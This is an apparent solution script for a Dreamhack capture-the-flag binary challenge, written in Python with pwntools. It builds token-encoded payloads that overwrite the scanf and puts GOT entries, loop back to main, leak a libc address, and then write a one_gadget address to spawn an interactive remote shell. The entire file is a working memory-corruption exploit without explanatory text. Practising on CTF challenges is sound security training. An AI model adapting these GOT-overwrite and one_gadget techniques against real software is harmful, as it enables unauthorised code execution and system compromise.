from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 18969
r = remote(HOST, PORT)

inc_dict = {0x1000: b'holymoly', 0x100: b'rolypoly', 0x10: b'monopoly', 0x1: b'guacamole'}
dec_dict = {0x1000: b'robocarpoli', 0x100: b'halligalli', 0x10: b'broccoli', 0x1: b'bordercollie'}

def convert(x):
    if x > 0:
        lst = inc_dict
    else:
        lst = dec_dict
        x = -x
    
    payload = b''
    while x > 0:
        if x >= 0x1000:
            x -= 0x1000
            payload += lst[0x1000]
        elif x >= 0x100:
            x -= 0x100
            payload += lst[0x100]
        elif x >= 0x10:
            x -= 0x10
            payload += lst[0x10]
        else:
            x -= 0x1
            payload += lst[0x1]
    
    return payload

puts_got=0x404018
scanf_got=0x404048

main=0x4011F6
decrease=0x4014EF

payload = b'mystery' # ptr
payload += convert(scanf_got)
payload += b'blueberry'
payload += convert(puts_got-scanf_got)

payload += b'mystery' # val
payload += convert(main)
payload += b'cranberry'

r.sendline(payload)
r.recvuntil(b'? ')
libc = u64(r.recv(8))-0x630b0
one_gadget=libc+0xe3b01

payload = b'mystery' # ptr
payload += convert(scanf_got)
payload += b'mystery' # val
payload += convert(one_gadget & 0xffffff)
payload += b'cranberry'

payload += b'mystery' # ptr
payload += inc_dict[0x1]*3
payload += b'mystery' # val
payload += convert(((one_gadget >> 24) & 0xffffff) - (one_gadget & 0xffffff))
payload += b'cranberry'

r.sendline(payload)

r.interactive()